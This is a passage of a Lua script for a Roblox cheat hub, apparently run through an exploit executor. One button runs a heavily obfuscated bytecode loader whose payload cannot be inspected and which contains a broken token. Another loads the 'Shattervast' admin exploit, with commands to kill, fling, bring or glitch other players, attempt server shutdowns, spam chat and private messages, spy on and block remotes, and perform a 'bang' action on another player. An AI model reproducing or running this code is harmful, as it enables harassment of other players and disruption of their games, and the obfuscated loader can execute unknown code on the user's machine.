CloseV4.MouseButton1Click:connect(function()
	UpdateFrame.Visible=false
end)

Info.MouseButton1Click:connect(function()
	HowToFrame.Visible = true
end)

CloseV5.MouseButton1Click:connect(function()
	HowToFrame.Visible = false 
end)
end)

SnowmanSimBtn.MouseButton1Down:Connect(function()
local function o(l)local D,B,A="","",{}local E=256;local F={}for C=0,E-1 do F[C]=string.char(C)end;local C=1;local n=tonumber;local function e()local D=n(l:sub(C,C),16)C=C+1;local B=n(l:sub(C,C+D-1),16)C=C+D;return B end;D=string.char(e())A[1]=D;while C<#l do local C=e()if F[C]then B=F[C]else B=D..D:sub(1,1)end;F[E]=D..B:sub(1,1)A[#A+1],D,E=B,B,E+1 end;return table.concat(A)end;local n=olocal C=select;local e=string.byte;local t=string.char;local F=string.sub;local f=table.concat;local o=math.ldexp;local d=getfenv;local l=unpack;local C=pcall;local C=tonumber;local E=bit and bit.bxor or function(C,D)local B,E=1,0 while C>0 and D>0 do local A,F=C%2,D%2 if A~=F then E=E+B end C,D,B=(C-A)/2,(D-F)/2,B*2 end if C<D then C=D end while C>0 do local D=C%2 if D>0 then E=E+B end C,B=(C-D)/2,B*2 end return E end local function B(B,C,D)if D then local C=(B/2^(C-1))%2^((D-1)-(C-1)+1);return C-C%1;else local C=2^(C-1);return(B%(C+C)>=C)and 1 or 0;end;end;local D=1;local function C()local C,B,A,F=e(n,D,D+3);C=E(C,182)B=E(B,182)A=E(A,182)F=E(F,182)D=D+4;return(F*16777216)+(A*65536)+(B*256)+C;end;local function A()return C()*4294967296+C();end;local function A()local C=E(e(n,D,D),182);D=D+1;return C;end;local function a()local D=C();local C=C();local A=1;local E=(B(C,1,20)*(2^32))+D;local D=B(C,21,31);local C=((-1)^B(C,32));if(D==0)then if(E==0)then return C*0;else D=1;A=0;end;elseif(D==2047)then return(E==0)and(C*(1/0))or(C*(0/0));end;return o(C,D-1023)*(A+(E/(2^52)));end;local c=C;local function o(C)local B;if(not C)then C=c();if(C==0)then return;end;end;B=F(n,D,D+C-2);D=D+C-1;local D={}for C=1,#B do D[C]=t(E(e(F(B,C,C)),182))end return f(D);end;local D=C;local function f()local l={};local e={};local n={};local c={};local D={};D[1]=l;D[2]=n;D[3]=e;for e=1,C()do local D=E(C(),203);local E=E(C(),75);local A=B(D,1,2);local F=B(E,1,7);local C={};C[1]=F;C[5]=E;C[2]=B(D,3,10);if(A==0)then C[3]=B(D,11,19);C[4]=B(D,20,28);elseif(A==1)then C[3]=B(E,8,25);elseif(A==2)then C[3]=B(E,8,25)-131071;end;l[e]=C;end;for B=1,C()do local D=A();local C;if(D==2)then C=(A()~=0);elseif(D==0)then C=a();elseif(D==1)then C=F(o(),1,-1);end;n[B-1]=C;end;for C=1,C()do e[C-1]=f();end;D[6]=A();D[5]=A();for D=1,C()do c[D]=C();end;return D;end;local function e(...)local C={...};return#C,C end;local function i(C,f,a)local c=C[1];local F=C[2];local d=C[3];local n=C[6];return function(...)local A=1;local B=-1;local o={};local E={...};local C=#E-1;local t={};local D={};for C=0,C do if(C>=n)then o[C-n]=E[C+1];else D[C]=E[C+1];end;end;local C;local E;while true do C=c[A];E=C[1];if E==0 then local E=C[2];if E>B then B=E end;D[E]=F[C[3]];elseif E==1 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]][F[C[4]]];elseif E==2 then local n;local A=C[2];local o={};local E=0;local F=A+C[3]-1;for C=A+1,F do E=E+1;o[E]=D[C];end;F,n=e(D[A](l(o,1,F-A)));F=A+C[4]-2;E=0;for C=A,F do E=E+1;D[C]=n[E];end;B=F;elseif E==3 then local E=C[2];if E>B then B=E end;D[E]=a[F[C[3]]];elseif E==4 then D[C[2]][F[C[3]]]=D[C[4]];elseif E==5 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]];elseif E==6 then A=A+C[3];elseif E==7 then D[C[2]][F[C[3]]]=F[C[4]];elseif E==8 then local E=C[2];local A=D[C[3]];D[E+1]=A;D[E]=A[F[C[4]]];if E+1>B then B=E+1 end;elseif E==9 then local E=C[2];if E>B then B=E end;D[E]=f[C[3]];elseif E==10 then local n;local E=C[2];local F={};local A=0;local C=E+C[3]-1;for C=E+1,C do A=A+1;F[A]=D[C];end;C,n=e(D[E](l(F,1,C-E)));B=E-1;elseif E==11 then return;elseif E==12 then local E=d[C[3]];local F;if E[5]~=0 then local C={};F=setmetatable({},{__index=function(B,D)local C=C[D];return C[1][C[2]];end,__newindex=function(E,D,B)local C=C[D]C[1][C[2]]=B;end;});for E=1,E[5]do A=A+1;local B=c[A];if B[1]==5 then C[E-1]={D,B[3]};elseif B[1]==9 then C[E-1]={f,B[3]};end;t[#t+1]=C;end;end;D[C[2]]=i(E,F,a);elseif E==13 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]][D[C[4]]];elseif E==14 then local C=C[2];local D,D=e(D[C]());B=C-1;elseif E==15 then if(F[C[3]]<D[C[4]])then A=A+1;end;elseif E==16 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]%F[C[4]];elseif E==17 then local n;local F=C[2];local o={};local E=0;local A=B;for C=F+1,A do E=E+1;o[E]=D[C];end;A,n=e(D[F](l(o,1,A-F)));A=F+C[4]-2;E=0;for C=F,A do E=E+1;D[C]=n[E];end;B=A;elseif E==18 then local F;local A=C[2];local n={};local E=0;local C=A+C[3]-1;for C=A+1,C do E=E+1;n[E]=D[C];end;C,F=e(D[A](l(n,1,C-A)));C=C+A-1;E=0;for C=A,C do E=E+1;D[C]=F[E];end;B=C;elseif E==19 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]/F[C[4]];elseif E==20 then local B=C[2];local A=B+C[3]-2;local E={};local C=0;for B=B,A do C=C+1;E[C]=D[B];end;return l(E,1,C);elseif E==21 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]-D[C[4]];elseif E==22 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]+D[C[4]];elseif E==23 then local F;local A=C[2];local n={};local C=0;local E=B;for B=A+1,E do C=C+1;n[C]=D[B];end;E,F=e(D[A](l(n,1,E-A)));E=E+A-1;C=0;for B=A,E do C=C+1;D[B]=F[C];end;B=E;elseif E==24 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]*F[C[4]];elseif E==25 then local C=C[2];if C>B then B=C end;D[C]={};elseif E==26 then local B=C[2];local F=C[4];local C=B+2;local E={D[B](D[B+1],D[C])};for B=1,F do D[C+B]=E[B];end;local B=D[B+3];if B then D[C]=B else A=A+1;end;elseif E==27 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]+F[C[4]];elseif E==28 then local A=C[3];local E=D[A]for C=A+1,C[4]do E=E..D[C];end;local C=C[2];if C>B then B=C end;D[C]=E;elseif E==29 then if(D[C[3]]==D[C[4]])then A=A+1;end;elseif E==30 then local B=C[2];local F=D[B+2];local E=D[B]+F;D[B]=E;if F>0 then if E<=D[B+1]then A=A+C[3];D[B+3]=E;end;elseif E>=D[B+1]then A=A+C[3];D[B+3]=E;end;elseif E==31 then local B=C[2];D[B]=D[B]-D[B+2];A=A+C[3];elseif E==32 then local E=C[2];if E>B then B=E end;D[E]=#D[C[3]];elseif E==33 then if(D[C[3]]<D[C[4]])then A=A+1;end;elseif E==34 then if(D[C[3]]~=D[C[4]])then A=A+1;end;elseif E==35 then if(D[C[3]]~=F[C[4]])then A=A+1;end;elseif E==36 then D[C[2]][D[C[3]]]=D[C[4]];elseif E==37 then local E=C[2];if E>B then B=E end;D[E]=D[C[3]]-F[C[4]];elseif E==38 then if D[C[2]]then A=A+1;end;end;A=A+1;end;end;end;return i(f(),{},d())();
end)

ShattervastBtn.MouseButton1Down:Connect(function()
-- By illremember#3799

-- Important Loading
trueSettings = {
    commandPrefix = ";";
    hotkeys = {};
    fchotkeymode = "unfc";
}

-- Important Variables
gsPlayers = game:GetService("Players")
gsWorkspace = game:GetService("Workspace")
gsLighting = game:GetService("Lighting")
gsReplicatedStorage = game:GetService("ReplicatedStorage")
gsCoreGui = game:GetService("CoreGui")
gsTween = game:GetService("TweenService")
gsHttp = game:GetService("HttpService")

LP = gsPlayers.LocalPlayer
Mouse = LP:GetMouse()

defaultSettings = gsHttp:JSONEncode(trueSettings)
function CreateSave()
    writefile("Shattervast.txt", defaultSettings)
    wait(0.5)
    local content = readfile("Shattervast.txt")
    local trueValue = gsHttp:JSONDecode(content)
    commandPrefix = trueValue.commandPrefix
    hotkeys = trueValue.hotkeys
    fchotkeymode = trueValue.fchotkeymode
end
function fullUpdate()
    local updatedSettings = {
        commandPrefix = commandPrefix;
        hotkeys = hotkeys;
        fchotkeymode = fchotkeymode;
    }
    local fullUPDATED = gsHttp:JSONEncode(updatedSettings)
    wait(0.2)
    writefile("Shattervast.txt", fullUPDATED)
end
if writefile ~= nil then
    function builder()
        local TESTsave = readfile("Shattervast.txt")
        if TESTsave == nil then
            return false
        else
            return true
        end
    end
    local success, message = pcall(builder)
    if success == true then
        function reader()
            local content = readfile("Shattervast.txt")
            local trueValue = gsHttp:JSONDecode(content)
            commandPrefix = trueValue.commandPrefix
            hotkeys = trueValue.hotkeys
            if trueValue.fchotkeymode == nil then
                fchotkeymode = "unfc"
                fullUpdate()
            else
                fchotkeymode = trueValue.fchotkeymode
            end
        end
        reader()
    elseif success == false then
        CreateSave()
    end
else
    commandPrefix = ";"
    hotkeys = {}
    fchotkeymode = "unfc"
end

CurrentGravity = gsWorkspace.Gravity
CurrentWalkspeed = LP.Character.Humanoid.WalkSpeed
CurrentJumppower = LP.Character.Humanoid.JumpPower
CurrentHipheight = LP.Character.Humanoid.HipHeight
CurrentNormal = LP.DevCameraOcclusionMode

gsWorkspace.Camera.Changed:Connect(function()
    gsWorkspace.Camera.FieldOfView = 70
end)

-- Important Functions
function view(plr)
    if plr.Character.Humanoid ~= nil then
        gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
    else
        gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Head
    end
end
function unlockWS()
    for i,part in pairs(gsWorkspace:GetDescendants()) do
        if part:IsA("Part") then
            part.Locked = false
        end
    end
end
function lockWS()
    for i,part in pairs(gsWorkspace:GetDescendants()) do
        if part:IsA("Part") then
            part.Locked = true
        end
    end
end
function FEGodmode()
    local changeview = false
    if gsWorkspace.CurrentCamera.CameraSubject == LP.Character.Humanoid or gsWorkspace.CurrentCamera.CameraSubject == LP.Character then
        changeview = true
    end
    LP.Character.Humanoid.Name = 1
    local l = LP.Character["1"]:Clone()
    l.Parent = LP.Character
    l.Name = "Humanoid"
    wait(0.1)
    LP.Character["1"]:Destroy()
    if changeview then
        game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
    end
    LP.Character.Animate.Disabled = true
    wait(0.1)
    LP.Character.Animate.Disabled = false
    LP.Character.Humanoid.DisplayDistanceType = "None"
end
function RocketPropulsion(maxthrust,maxspeed,thrustp,targetplr,name)
    local l = Instance.new("RocketPropulsion")
    l.Parent = LP.Character.HumanoidRootPart
    l.CartoonFactor = 1
    l.MaxThrust = maxthrust
    l.MaxSpeed = maxspeed
    l.ThrustP = thrustp
    l.Name = name
    l.Target = targetplr.Character.HumanoidRootPart
    l:Fire()
end
function createIntro(style, msg, length)
    if gsCoreGui:FindFirstChild("Notification") then
        gsCoreGui:FindFirstChild("Notification"):Destroy()
    end
    local info = "http://www.roblox.com/asset/?id=1281284684"
    local warning = "http://www.roblox.com/asset/?id=1281286925"
    if style == "info" then
        style = info
    elseif style == "warning" then
        style = warning
    end
    local Notification = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local IMAGE = Instance.new("ImageLabel")
    Notification.Name = "Notification"
    Notification.Parent = gsCoreGui
    Frame.Parent = Notification
    Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
    Frame.BackgroundTransparency = 0.20000000298023
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0, 0, -0.2, 0)
    Frame.Size = UDim2.new(1, 0, 0, 30)
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Size = UDim2.new(1, 0, 1, 0)
    TextLabel.Font = Enum.Font.SourceSansLight
    TextLabel.Text = msg
    TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    IMAGE.Parent = Frame
    IMAGE.BackgroundTransparency = 1
    IMAGE.Size = UDim2.new(0, 50, 0, 50)
    IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
    IMAGE.Image = style
    local Intro = Instance.new("ScreenGui")
    local Frame2 = Instance.new("Frame")
    local IMAGE2 = Instance.new("ImageLabel")
    Intro.Name = "Intro"
    Intro.Parent = gsCoreGui
    Frame2.Parent = Intro
    Frame2.BackgroundTransparency = 1
    Frame2.BorderSizePixel = 0
    Frame2.Position = UDim2.new(0, 0, -0.2, 0)
    Frame2.Size = UDim2.new(1, 0, 0, 30)
    IMAGE2.Parent = Frame
    IMAGE2.BackgroundTransparency = 1
    IMAGE2.AnchorPoint = Vector2.new(0.5, 0)
    IMAGE2.Size = UDim2.new(0, 240, 0, 120)
    IMAGE2.Position = UDim2.new(0.5, 0, 0, 0)
    IMAGE2.Image = "http://www.roblox.com/asset/?id=1795472522"
    Frame2:TweenPosition(UDim2.new(0, 0, 0, 200), "Out", "Quad", 1.5)
    Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
    wait(length)
    pcall(function()
        Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
        Frame2:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
    end)
    wait(3.01)
    Intro:Destroy()
    Notification:Destroy()
end
function Notification(style, msg, length)
    if gsCoreGui:FindFirstChild("Notification") then
        gsCoreGui:FindFirstChild("Notification"):Destroy()
    end
    local info = "http://www.roblox.com/asset/?id=1281284684"
    local warning = "http://www.roblox.com/asset/?id=1281286925"
    if style == "info" then
        style = info
    elseif style == "warning" then
        style = warning
    end
    local Notification = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local IMAGE = Instance.new("ImageLabel")
    Notification.Name = "Notification"
    Notification.Parent = gsCoreGui
    Frame.Parent = Notification
    Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
    Frame.BackgroundTransparency = 0.20000000298023
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0, 0, -0.2, 0)
    Frame.Size = UDim2.new(1, 0, 0, 30)
    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Size = UDim2.new(1, 0, 1, 0)
    TextLabel.Font = Enum.Font.SourceSansLight
    TextLabel.Text = msg
    TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
    TextLabel.TextScaled = true
    TextLabel.TextSize = 14
    TextLabel.TextWrapped = true
    IMAGE.Parent = Frame
    IMAGE.BackgroundTransparency = 1
    IMAGE.Size = UDim2.new(0, 50, 0, 50)
    IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
    IMAGE.Image = style
    Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
    wait(length)
    pcall(function()
        Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
    end)
    wait(3.01)
    Notification:Destroy()
end
function hasTools()
    local a = false
    local b = false
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Tool") then
            if v ~= nil then
                a = true
            else
                a = false
            end
        end
    end
    for i,k in pairs(LP.Backpack:GetDescendants()) do
        if k:IsA("Tool") then
            if k ~= nil then
                b = true
            else
                b = false
            end
        end
    end
    return a or b
end
Compliments = {" is the coolest person in this server!", ", I really like your avatar!", ", I really want to be your friend!", " is truly amazing. Truly!", " is incredible!", ", you are my favourite here!!", ", I am complimenting you right now at this very moment.", " you are really awesome", " when will you be my friend!?", " is such a great person", " is a fantastic person!"}
function complimentplr(player)
    local plrName = player.Name
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrName..Compliments[math.random(1, #Compliments)], "All")
end
function createINFO(player)
    local InfoGUIv2 = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local Frame_2 = Instance.new("Frame")
    local infoguiCLOSE = Instance.new("TextButton")
    local Frame_3 = Instance.new("Frame")
    local playerName = Instance.new("TextLabel")
    local Frame_4 = Instance.new("Frame")
    local playerAvatar = Instance.new("ImageLabel")
    local playerAccAge = Instance.new("TextLabel")
    local playerId = Instance.new("TextLabel")
    local playerOs = Instance.new("TextLabel")
    local playerMembership = Instance.new("TextLabel")
    local Frame_5 = Instance.new("Frame")
    local Frame_6 = Instance.new("Frame")
    InfoGUIv2.Name = "InfoGUIv2"
    InfoGUIv2.Parent = gsCoreGui
    Frame.Parent = InfoGUIv2
    Frame.BackgroundColor3 = Color3.new(0, 0, 0)
    Frame.BackgroundTransparency = 1
    Frame.BorderColor3 = Color3.new(0, 0, 0)
    Frame.ClipsDescendants = true
    Frame.Position = UDim2.new(0.45, 0, 1, 0)
    Frame.Size = UDim2.new(0, 265, 0, 302)
    Frame.ZIndex = -1
    Frame_2.Parent = Frame
    Frame_2.BackgroundColor3 = Color3.new(0.290196, 0, 0.447059)
    Frame_2.BorderSizePixel = 0
    Frame_2.Size = UDim2.new(0, 260, 0, 20)
    infoguiCLOSE.Name = "infoguiCLOSE"
    infoguiCLOSE.Parent = Frame_2
    infoguiCLOSE.BackgroundColor3 = Color3.new(1, 1, 1)
    infoguiCLOSE.BackgroundTransparency = 1
    infoguiCLOSE.BorderSizePixel = 0
    infoguiCLOSE.Position = UDim2.new(0, 230, 0, 0)
    infoguiCLOSE.Size = UDim2.new(0, 30, 0, 20)
    infoguiCLOSE.Font = Enum.Font.SourceSansBold
    infoguiCLOSE.Text = "X"
    infoguiCLOSE.TextColor3 = Color3.new(0.992157, 0.992157, 0.992157)
    infoguiCLOSE.TextSize = 20
    Frame_3.Parent = Frame
    Frame_3.BackgroundColor3 = Color3.new(0.482353, 0.121569, 0.635294)
    Frame_3.BorderSizePixel = 0
    Frame_3.Position = UDim2.new(0, 0, 0, 20)
    Frame_3.Size = UDim2.new(0, 260, 0, 40)
    playerName.Name = "playerName"
    playerName.Parent = Frame_3
    playerName.BackgroundColor3 = Color3.new(1, 1, 1)
    playerName.BackgroundTransparency = 1
    playerName.Position = UDim2.new(0, 10, 0, 5)
    playerName.Size = UDim2.new(0, 240, 0, 30)
    playerName.Font = Enum.Font.SourceSansLight
    playerName.Text = player.Name
    playerName.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)
    playerName.TextScaled = true
    playerName.TextSize = 14
    playerName.TextWrapped = true
    Frame_4.Parent = Frame
    Frame_4.BackgroundColor3 = Color3.new(0.956863, 0.956863, 0.956863)
    Frame_4.BorderSizePixel = 0
    Frame_4.Position = UDim2.new(0, 0, 0, 60)
    Frame_4.Size = UDim2.new(0, 260, 0, 237)
    playerAvatar.Name = "playerAvatar"
    playerAvatar.Parent = Frame_4
    playerAvatar.BackgroundColor3 = Color3.new(1, 1, 1)
    playerAvatar.Position = UDim2.new(0, 85, 0, 10)
    playerAvatar.Size = UDim2.new(0, 85, 0, 85)
    playerAvatar.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..player.Name
    playerAccAge.Name = "playerAccAge"
    playerAccAge.Parent = Frame_4
    playerAccAge.BackgroundColor3 = Color3.new(1, 1, 1)
    playerAccAge.BackgroundTransparency = 1
    playerAccAge.Position = UDim2.new(0, 5, 0, 101)
    playerAccAge.Size = UDim2.new(0, 250, 0, 30)
    playerAccAge.Font = Enum.Font.SourceSans
    playerAccAge.Text = "Account Age: "..player.AccountAge
    playerAccAge.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
    playerAccAge.TextScaled = true
    playerAccAge.TextSize = 14
    playerAccAge.TextWrapped = true
    playerId.Name = "playerId"
    playerId.Parent = Frame_4
    playerId.BackgroundColor3 = Color3.new(1, 1, 1)
    playerId.BackgroundTransparency = 1
    playerId.Position = UDim2.new(0, 5, 0, 131)
    playerId.Size = UDim2.new(0, 250, 0, 30)
    playerId.Font = Enum.Font.SourceSans
    playerId.Text = "Account ID: "..player.UserId
    playerId.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
    playerId.TextScaled = true
    playerId.TextSize = 14
    playerId.TextWrapped = true
    playerOs.Name = "playerOs"
    playerOs.Parent = Frame_4
    playerOs.BackgroundColor3 = Color3.new(1, 1, 1)
    playerOs.BackgroundTransparency = 1
    playerOs.Position = UDim2.new(0, 5, 0, 161)
    playerOs.Size = UDim2.new(0, 250, 0, 30)
    playerOs.Font = Enum.Font.SourceSansLight
    playerOs.Text = "Player OS: "..player.OsPlatform
    playerOs.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
    playerOs.TextScaled = true
    playerOs.TextSize = 14
    playerOs.TextWrapped = true
    playerMembership.Name = "playerMembership"
    playerMembership.Parent = Frame_4
    playerMembership.BackgroundColor3 = Color3.new(1, 1, 1)
    playerMembership.BackgroundTransparency = 1
    playerMembership.Position = UDim2.new(0, 5, 0, 191)
    playerMembership.Size = UDim2.new(0, 250, 0, 30)
    playerMembership.Font = Enum.Font.SourceSansLight
    if player.MembershipType == Enum.MembershipType.None then
        playerMembership.Text = "No builder's club."
    elseif player.MembershipType == Enum.MembershipType.BuildersClub then
        playerMembership.Text = "Builder's club!"
    elseif player.MembershipType == Enum.MembershipType.TurboBuildersClub then
        playerMembership.Text = "Turbo Builder's club!"
    elseif player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
        playerMembership.Text = "Outrageous Builder's club!"
    end
    playerMembership.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
    playerMembership.TextScaled = true
    playerMembership.TextSize = 14
    playerMembership.TextWrapped = true
    Frame_5.Parent = Frame
    Frame_5.BackgroundColor3 = Color3.new(0, 0, 0)
    Frame_5.BackgroundTransparency = 0.69999998807907
    Frame_5.BorderColor3 = Color3.new(0, 0, 0)
    Frame_5.BorderSizePixel = 0
    Frame_5.ClipsDescendants = true
    Frame_5.Position = UDim2.new(0, 10, 0, 10)
    Frame_5.Selectable = true
    Frame_5.Size = UDim2.new(0, 255, 0, 292)
    Frame_5.ZIndex = -1
    Frame_6.Parent = Frame
    Frame_6.BackgroundColor3 = Color3.new(0, 0, 0)
    Frame_6.BackgroundTransparency = 0.69999998807907
    Frame_6.BorderColor3 = Color3.new(0, 0, 0)
    Frame_6.BorderSizePixel = 0
    Frame_6.ClipsDescendants = true
    Frame_6.Position = UDim2.new(0, 8, 0, 8)
    Frame_6.Selectable = true
    Frame_6.Size = UDim2.new(0, 255, 0, 292)
    Frame_6.ZIndex = -1
    local closeGet = {}
    closeGet.Size = UDim2.new(0, 0, 0, 0)
    local openGet = {}
    openGet.Position = UDim2.new(0.45, 0, 0.45, 0)
    local closeFunction = gsTween:Create(Frame, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), closeGet)
    local openFunction = gsTween:Create(Frame, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), openGet)
    infoguiCLOSE.MouseButton1Click:Connect(function()
        closeFunction:Play()
        Frame:TweenPosition((Frame.Position + UDim2.new(0, 265 / 2, 0, 302 / 2)), "InOut", "Sine", 2)
        wait(2.01)
        Frame:Destroy()
    end)
    openFunction:Play()
    local UserInputService = game:GetService("UserInputService")
    local dragging
    local dragInput
    local dragStart
    local startPos
    local function update(input)
        local delta = input.Position - dragStart
        local dragTime = 0.055
        local SmoothDrag = {}
        SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        local dragSmoothFunction = gsTween:Create(Frame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
        dragSmoothFunction:Play()
    end
    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging and Frame.Size == UDim2.new(0, 265, 0, 302) then
            update(input)
        end
    end)
end
function clientSided()
    Notification("info", "This command is for the client (you) only, no one else can see!", 6)
end
searchCmds={"1 print [msg] - Prints a message to the developer console","2 warn [msg] - Warns a message to the developer console","3 sit - Makes you sit","4 god - Activates FE Godmode (breaks tools)","5 view [plr] - Changes your camera subject to another player","6 unview - Changes your camera back to your player","7 gravity [num] - Changes workspace gravity to [num]","8 ungravity - Reverts workspace gravity to game's default","9 goto [plr] - Teleports you to a player","10 fecheck - Checks whether the game is FE or not","11 lockws - Locks the whole workspace","12 unlockws - Unlocks the whole workspace","13 noclip - Allows you to walk through walls and other objects","14 clip - Stops noclip, can collide","15 follow [plr] / [num] - Makes you follow a player constantly, optional [num] for how far away to follow","16 unfollow - Stops you from following","17 fling [plr] / [pow] - Uses your character to fling a player, optional [pow] for how much power to put into the fling","18 unfling - Stops you from flinging","19 trail [plr] / [num] - Makes you trail (walk infront) of a player constantly, optional [num] for how far away to trail","20 untrail - Stops you from trailing","21 annoy [plr] - Loop teleports you to the player","22 unannoy - Stops loop teleporting you","23 reset - Resets your character","24 grespawn - Respawns your character, best for use after FE godmode","25 respawn - Respawns your character, best to use if grespawn fails to work","26 speed // ws [num] - Changes your walkspeed (speed or ws) to [num]","27 jumppower // jp [num] - Changes your jumppower (jumppower or jp) to [num]","28 hipheight // hh [num] - Changes your hipheight (hipheight or hh) to [num]","29 default - Changes your walkspeed, jumppower and hipheight back to normal","30 credits - Displays admin credits (by illremember#3799)","31 attach [plr] - Attaches you to a player, tool required","32 fly / [speed] - Enables fly, optional [speed] for how fast to fly","33 unfly - Disables fly","34 kill [plr] - Kills a player, tool required","35 bring [plr] - Brings a player, tool required","36 naked - Displays avatar body colours","37 nolimbs - Deletes all your arms and legs","38 noarms - Deletes both your arms","39 nolegs - Deletes both your legs","40 antikick [on/off] - Blocks all remotes for antikick when on, disables when off","41 blockremote [remote] / [service] - Blocks a remote from firing, optional [service] for where the remote is located","42 remotespy [on/off] - Prints all remotes to developer console when on when fired, stops printing when off","43 bang [plr] / [speed] - Bangs a player, optional [speed] to set animation adjust speed","44 unbang - Stops bang player","45 spam [msg] - Spams [msg] in chat","46 spamdelay [num] - Sets how long to wait in between spamming","47 unspam - Stops spamming","48 info [plr] - Creates GUI with information about player account, shows Account age, membership and account ID","49 age [plr] - Chats account age of player","50 invisible - Enables FE invisibility, by Timeless","51 walk [plr] - Begins to make you loop walk towards player","52 glitch [plr] / [num] - Glitches a player, tool required, optional [num] for strength of glitch","53 tp [plr] [plr] - Teleports a player to another player, tool required","54 givetool [plr] / [tool] - Gives your current equipped tool to player, optional [tool] to pick a tool by name from your inventory","55 givealltools [plr] - Gives all tools currently equipped and in inventory to player","56 blockhats - Removes mesh of all accessories","57 blocktool - Removes mesh of currently equipped tool","58 orbit [plr] - Begins to make you orbit around a player","59 unorbit - Stops you orbiting a player","60 pos - Shows your current position","61 savepos - Saves your current position","62 loadpos - Loads your current position from savepos","63 tppos [num] [num] [num] - Teleports you to position [num], [num], [num]","64 pmspam [plr] [msg] - Makes you spam a player's pm with [msg]","65 unpmspam - Stops spamming a player's pm","66 wsvis [num] - Changes all parts in workspace to [num] transparency","67 bringobj [obj] / [num] - Brings an object in the workspace to you, optional [num] for how far away to bring object","68 cbring [plr] - Brings a player to you constantly on client","69 uncbring - Stops bringing a player to you on client","70 cfreeze [plr] - Freezes a player on your client","71 uncfreeze / [plr] - Unfreezes a player on your cleint","72 unattach - Unattaches you from a player","73 reach [on/off] / [num] - Activates/Deactivates reach for currently equipped tool, optional [num] for how long the reach should be","74 droptool / [tool] - Drops a tool into the workspace, optional [tool] command for which tool to drop","75 drophats - Drops all your accessories into the workspace","76 hidecmdbar - Hides the command bar","77 showcmdbar - Shows the command bar","78 prefix [key] - Changes your prefix to [key] must be 1 character","79 removeinvis - Removes all invisible parts in workspace","80 removefog - Removes fog in lighting","81 animation [id/gui] / [speed] - Makes you play an animation with [id], optional [speed] for adjusting animation speed OR [gui] to open Energize animation GUI","82 btools - Gives you btools for deleting, copying and dragging (client side)","83 esp [plr] - Enables an esp for that player, credits to Infinite Yield","84 unesp / [plr] - Disables all esp, optional [plr] for disabling esp just for that player","85 dice - Chats you rolling a dice for 1, 2, 3, 4, 5 or 6","86 random [min] [max] - Chats you picking a random number between [min] and [max]","87 closegame - Shutsdown/closes your game","88 savetool / [tool] - Saves a tool to your player equipped, optional [tool] for which tool to save in your inventory","89 loadtool / [tool] - Loads a tool from your player, optional [tool] for which tool to load by name","90 savealltool - Saves all tools in your character/inventory","91 loadalltool - Loads all tools in your player saved tools","92 clicktp / [key] - Enables click teleport, optional [key] to set a key instead of clicking","93 clickdel / [key] - Enables click delete part, optional [key] to set a key instead of clicking","94 unclicktp - Disables clicktp","95 unclickdel - Disables clickdel","96 shutdown - Attempts a server shutdown","97 chatlogs - Opens up a chat log gui with options to print chat to developer console","98 stopadmin - Disables currently 